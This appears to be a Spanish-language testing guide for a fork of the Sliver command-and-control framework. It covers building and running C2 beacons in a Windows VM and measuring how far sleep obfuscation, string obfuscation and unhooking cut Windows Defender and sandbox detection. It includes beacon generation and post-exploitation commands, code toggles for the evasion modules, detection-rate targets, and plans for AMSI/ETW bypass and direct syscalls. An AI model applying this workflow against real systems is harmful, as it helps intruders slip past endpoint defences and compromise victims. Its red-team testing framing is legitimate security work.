# Instrucciones para Testing de Nivel 1 - Evasión EDR/AV

## Binarios Generados

Los siguientes binarios de Windows AMD64 han sido generados exitosamente:

```
sliver-client.exe    (37 MB) - Cliente de Sliver para generar beacons
sliver-server.exe    (196 MB) - Servidor C2 de Sliver
```

**Fecha de Generación:** 2026-02-20 18:12:00
**Técnicas de Evasión Incluidas:** Nivel 1 (Sleep Obfuscation, String Obfuscation, Improved Unhooking)

---

## Preparación del Entorno de Windows

### Opción A: Máquina Virtual (Recomendado para Testing)

**Requisitos:**
- VMware Workstation o VirtualBox
- ISO de Windows 10/11 Pro (x64)
- Mínimo 4GB RAM (8GB recomendado)
- 50GB de espacio en disco

**Pasos:**
1. Crear nueva VM Windows 10/11 Pro x64
2. Instalar sin conexión a internet (sandbox básico)
3. Actualizar Windows completamente (Windows Update)
4. Activar Windows Defender (por defecto, ya está activo)
5. Hacer snapshot inicial "Clean - Baseline"

### Opción B: Máquina Física (Solo si está disponible)

**Requisitos:**
- Windows 10/11 Pro x64
- Windows Defender activo
- No tener otros AVs/EDRs instalados

**Advertencia:**
⚠️ **NO** ejecutar estos binarios en tu máquina de producción o principal
⚠️ Usar solo en entorno de testing aislado
⚠️ Los binarios tienen técnicas de evasión que podrían detectarse como malware

---

## Procedimiento de Testing

### Fase 1: Configuración Inicial (5-10 minutos)

**En la VM Windows:**

1. **Transferir Binarios**
   - Copiar `sliver-client.exe` y `sliver-server.exe` a la VM
   - Ubicación sugerida: `C:\Users\Admin\Desktop\RedBaphomet\`

2. **Preparar Logging**
   - Abrir **Event Viewer** (eventvwr.msc)
   - Navegar a: Windows Logs → Applications and Services → Microsoft → Windows Defender → Operational
   - Dejar la ventana abierta para monitorear alertas

3. **Iniciar Servidor C2**
   ```powershell
   cd C:\Users\Admin\Desktop\RedBaphomet
   .\sliver-server.exe --lport 31337
   ```
   - Mantener el servidor corriendo en una terminal separada

4. **Verificar Escucha del Servidor**
   ```powershell
   # En PowerShell (otra terminal)
   netstat -an | findstr "31337"
   ```
   - Debe mostrar: `TCP    0.0.0.0:31337    0.0.0.0    LISTENING`

---

### Fase 2: Baseline Testing (30-45 minutos)

**Objetivo:** Medir tasa de detección SIN técnicas de evasión

**Nota:** Para probar el baseline, necesitas un beacon generado SIN las técnicas de Nivel 1.
Como los binarios actuales ya incluyen evasión, compara con:
- Un beacon generado desde el repo original de BishopFox/Sliver
- O genera un beacon de prueba con técnicas desactivadas (ver notas abajo)

**Pasos:**

1. **Generar Beacon de Baseline**
   ```powershell
   # En la terminal del cliente (en macOS):
   cd /Users/jorge/Tools/RedBaphomet
   # O usar el binario generado:
   ./sliver-client.exe

   # Dentro de Sliver CLI:
   generate --os windows --arch amd64 --format exe --http https://localhost:8443
   ```

2. **Ejecutar Beacon de Baseline**
   ```cmd
   # En CMD en la VM Windows:
   cd C:\Users\Admin\Desktop\RedBaphomet
   beacon-baseline.exe
   ```

3. **Observar y Documentar**

| Observación | Baseline Beacon | Nivel 1 Beacon |
|-------------|-----------------|----------------|
| Tiempo hasta detección Defender | ___s | ___s |
| Tipo de alerta | ___ | ___ |
| Mensaje de alerta | ___ | ___ |
| ¿Beacon establece C2? | Si/No | Si/No |

**Capturas Necesarias:**
1. Alerta de Windows Defender (captura de pantalla)
2. Event Viewer con alerta (captura de pantalla)
3. Sliver server console (captura de pantalla)

---

### Fase 3: Nivel 1 Testing (30-45 minutos)

**Objetivo:** Validar que las técnicas de evasión reducen la detección

**Pasos:**

1. **Generar Beacon con Nivel 1**
   El beacon actual YA incluye las técnicas de Nivel 1:
   - ✅ Sleep Obfuscation (encriptación durante sleep)
   - ✅ String Obfuscation (DLL names ofuscados)
   - ✅ Improved Unhooking (restauración selectiva)

   Generar beacon:
   ```powershell
   generate --os windows --arch amd64 --format exe --http https://localhost:8443
   ```

2. **Ejecutar Beacon Nivel 1**
   ```cmd
   cd C:\Users\Admin\Desktop\RedBaphomet
   beacon-level1.exe
   ```

3. **Verificar Logs de Evasión**
   
   El beacon debería mostrar logs de evasión activa:
   - `[*] Starting obfuscated sleep for X duration` (Sleep Obfuscation)
   - `[*] Obfuscated sleep completed` (Sleep Obfuscation)
   - DLL names de-ofuscados en runtime (String Obfuscation)
   - `[-] Restoring prolog for X at 0x...` (Improved Unhooking)

   Si NO ves estos logs, la evasión NO está activa.

4. **Observar y Documentar**

| Observación | Baseline | Nivel 1 | Mejora |
|-------------|-----------|-----------|---------|
| Tiempo hasta detección | ___s | ___s | ___% |
| Tipo de alerta | ___ | ___ | ___ |
| ¿Se detectó? | Si/No | Si/No | ___ |
| ¿Beacon establece? | Si/No | Si/No | ___ |

---

### Fase 4: Validación Funcional (15-20 minutos)

**Objetivo:** Verificar que el beacon funciona correctamente con evasión

**Pasos:**

1. **Verificar Conexión C2**
   ```powershell
   # En Sliver server console:
   # Deberías ver el beacon aparecer en la lista de sessions
   ```

2. **Ejecutar Comandos de Prueba**
   
   Desde el servidor C2 (Sliver CLI), ejecutar:
   ```
   sessions
   interact <session-id>
   ps
   hostname
   whoami
   ```

3. **Verificar Sleep Obfuscation**
   - Esperar a que el beacon entre en sleep (checkins)
   - Deberías ver logs de "Obfuscated sleep"
   - La memoria debería estar encriptada durante sleep

4. **Documentar Resultados**

| Comando | Funciona Baseline? | Funciona Nivel 1? | Observaciones |
|----------|-------------------|-------------------|---------------|
| ps | Si/No | Si/No | ___ |
| hostname | Si/No | Si/No | ___ |
| whoami | Si/No | Si/No | ___ |
| Sleep con evasión | N/A | Si/No (logs de obfuscación) | ___ |

---

### Fase 5: Memory Scanning (Opcional, 20-30 minutos)

**Objetivo:** Validar que Sleep Obfuscation previene memory scanning

**Herramientas Requeridas:**
- Process Explorer (Sysinternals) - https://learn.microsoft.com/sysinternals
- VMMap (Sysinternals) - https://learn.microsoft.com/sysinternals

**Pasos:**

1. **Abrir Process Explorer**
   - Descargar y ejecutar Process Explorer
   - Encontrar el proceso del beacon (`beacon.exe` o `beacon-baseline.exe`)

2. **Escanear Memoria**
   - Clic derecho en el proceso → Properties → Memory
   - Buscar strings legibles en la memoria del proceso
   - Buscar patrones de shellcode (NOP sled, etc.)

3. **Comparar Baseline vs Nivel 1**

| Hallazgo | Baseline Beacon | Nivel 1 Beacon | Validación |
|-----------|-----------------|-------------------|-----------|
| Strings legibles en memoria | Si/No | Si/No | ✅ Si Nivel 1 está activo |
| Shellcode detectable | Si/No | Si/No | ✅ Si Nivel 1 está activo |
| Heap encriptado durante sleep | N/A | Si/No | ✅ Sleep obfuscation funciona |

---

## Deshabilitar Evasión (Si Necesario para Testing)

Si necesitas probar si las técnicas están causando problemas:

### Deshabilitar String Obfuscation
En el código fuente (`implant/sliver/evasion/string_obfuscation.go`):
```go
// Cambiar:
obfuscationEnabled = true

// A:
obfuscationEnabled = false
```

### Deshabilitar Sleep Obfuscation
En el código fuente (`implant/sliver/evasion/sleep_obfuscation.go`):
```go
// Cambiar:
sleepObfuscationConfig.enabled = true

// A:
sleepObfuscationConfig.enabled = false
```

### Deshabilitar Improved Unhooking
En `implant/sliver/taskrunner/task_windows.go`, encontrar la llamada a `refresh()`:
```go
// Comentar o modificar:
err := refresh()
if err != nil {
    return err
}

// A:
err := nil // Deshabilitar refresh
```

Luego rebuild:
```bash
make clean && make windows-amd64
```

---

## Sandbox Testing (Opcional, 15-30 minutos)

### ANY.RUN

1. Visitar: https://any.run
2. Click: "Upload File" o arrastrar `beacon-level1.exe`
3. Ejecutar análisis completo (30 segundos)
4. Documentar:
   - Número de AVs que detectaron: ___/60
   - Categoría: ___
   - Nombres de AVs que detectaron: ___

### Hybrid Analysis

1. Visitar: https://www.hybrid-analysis.com
2. Subir `beacon-level1.exe`
3. Ejecutar análisis completo
4. Documentar:
   - Tasa de detección: ___%
   - Comportamiento identificado: ___

### VirusTotal

1. Visitar: https://www.virustotal.com
2. Subir `beacon-level1.exe`
3. Esperar análisis completo (puede tomar 1-2 minutos)
4. Documentar:
   - Detección: ___/70
   - Principales AVs que detectaron: ___

---

## Métricas de Éxito - Nivel 1

### Objetivos Mínimos para Aprobación

| Métrica | Baseline | Objetivo Nivel 1 | Criterio |
|----------|-----------|-------------------|-----------|
| Detección estática (AV) | 70-80% | ≤50% | ✅ Pasado |
| Detección durante sleep | 60-70% | ≤45% | ✅ Pasado |
| Tiempo hasta detección | <60s | >90s o no detectado | ✅ Pasado |
| Funcionalidad del beacon | 90% | ≥95% | ✅ Pasado |

### Criterio General de Aprobación

Para aprobar el Nivel 1, debe cumplirse:
- ✅ Al menos 3 de 4 métricas cuantitativas cumplidas
- ✅ Payload funcional ≥95% de las veces
- ✅ No hay regresión en funcionalidad existente
- ✅ Todas las técnicas (Sleep, String, Unhooking) están activas
- ✅ Documentación completa de resultados

---

## Troubleshooting

### Problema: Beacon No Se Conecta al C2

**Síntomas:**
- `beacon.exe` se ejecuta pero no aparece en el servidor C2
- No hay logs de conexión en el servidor

**Soluciones:**
1. Verificar que el servidor C2 está corriendo y escuchando en el puerto 31337
2. Verificar firewall de Windows: `netsh advfirewall show all`
3. Verificar que no hay otro software bloqueando la conexión
4. Revisar logs del beacon: `beacon.exe` debería mostrar intentos de conexión

### Problema: Detección Inmediata (<5 segundos)

**Síntomas:**
- Windows Defender detecta el beacon casi inmediatamente
- El beacon termina antes de establecer conexión C2

**Posibles Causas:**
- Firma estática detectada
- Strings de DLL no están completamente ofuscados
- El beacon tiene comportamiento anómalo

**Soluciones:**
1. Verificar que string obfuscation está activa
2. Revisar strings en el binario:
   ```cmd
   strings beacon-level1.exe | findstr /i "dll ntdll kernel32"
   ```
3. Si se detectan strings, mejorar obfuscation
4. Usar un beacon generado de fuente diferente

### Problema: Sleep Obfuscation No Funciona

**Síntomas:**
- No se ven logs de "Obfuscated sleep"
- El beacon se comporta como si no tuviera evasión

**Soluciones:**
1. Verificar que `sleepObfuscationConfig.enabled = true` en el código
2. Verificar logs del beacon
3. Si hay crashes, deshabilitar sleep obfuscation y probar de nuevo

### Problema: String De-obfuscation Falla

**Síntomas:**
- El beacon no puede encontrar DLLs
- Errores de "DLL not found"

**Soluciones:**
1. Verificar que `obfuscationEnabled = true`
2. Verificar que las constantes están definidas correctamente
3. Revisar logs de errores del beacon

---

## Documentación para Commit a Dev

### Resultados a Documentar

Después de completar todo el testing, crea un resumen con:

1. **Resultados de Baseline**
   ```
   - Tiempo hasta detección: ___s
   - Tipo de alerta: ___
   - Beacon estableció C2: Si/No
   - Capturas: adjuntar screenshots de alertas
   ```

2. **Resultados de Nivel 1**
   ```
   - Tiempo hasta detección: ___s
   - Mejora: ___% más rápido / no detectado
   - Funcionalidad: ___% de comandos exitosos
   - Logs de evasión: adjuntar capturas
   ```

3. **Resultados de Sandbox**
   ```
   - ANY.RUN: ___/60 detección
   - Hybrid Analysis: ___% detección
   - VirusTotal: ___/70 detección
   ```

4. **Conclusiones**
   ```
   - ¿Se cumplieron objetivos de Nivel 1? Si/No
   - ¿Recomendar merge a dev? Si/No
   - ¿Necesitas ajustes adicionales? Si/No
   ```

---

## Próximos Pasos

### Después de Testing Exitoso

1. **Crear Pull Request**
   - URL: https://github.com/vsh00t/RedBaphomet/pull/new/evasion-level-1-sleep-obfuscation
   - Desde: `evasion-level-1-sleep-obfuscation`
   - Hacia: `dev`
   - Incluir: Resultados de testing, capturas, métricas

2. **Code Review**
   - Esperar aprobación de al menos 1 reviewer
   - Addressar cualquier feedback de revisión

3. **Merge a Dev**
   - Esperar que CI pase en la PR
   - Merge tras aprobación

4. **Comenzar Nivel 2** (si Nivel 1 es aprobado)
   - Direct Syscalls Implementation
   - Module Stomping
   - Enhanced AMSI/ETW Bypass

---

## Archivos de Referencia

**Documentación de Testing:**
- `docs/EVASION_LEVEL_1_TESTING.md` - Guía completa de testing
- `EVASION_LEVEL_1_SUMMARY.md` - Resumen de implementación

**Código de Evasión:**
- `implant/sliver/evasion/sleep_obfuscation.go` - Sleep Obfuscation
- `implant/sliver/evasion/string_obfuscation.go` - String Obfuscation
- `implant/sliver/evasion/evasion_windows.go` - Improved Unhooking

**Análisis:**
- `EVASION_ANALYSIS.md` - Análisis completo y plan de 3 niveles

---

**Fecha:** 2026-02-20
**Nivel:** Nivel 1 - Básico
**Estado:** ✅ Implementación Completa, ✅ Binarios Generados, ⏳ Testing Pendiente (Usuario)
**Binarios:** `sliver-client.exe` (37MB), `sliver-server.exe` (196MB)
